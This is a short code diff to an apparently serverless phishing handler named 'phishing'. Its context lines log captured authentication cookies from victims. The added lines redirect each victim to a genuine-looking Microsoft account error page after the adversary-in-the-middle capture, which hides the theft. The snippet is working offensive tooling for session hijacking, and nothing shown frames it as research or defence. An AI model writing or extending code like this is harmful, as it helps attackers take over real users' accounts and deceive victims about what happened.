@@ -157,6 +157,14 @@ app.http("phishing", {
           "Captured required authentication cookies: <br>" +
             JSON.stringify(cookies)
         );
+        // Victim redirect after successful AiTM capture
+        return new Response(null, {
+          status: 302,
+          headers: {
+            "Location":
+              "https://account.live.com/error.aspx?errcode=1086&authid=ZvQ8uXRHNmG71wEy5ToYkrsMcfvAdtBqZPWpg4",
+          },
+        });
       }
     } catch (error) {
       console.error(error);
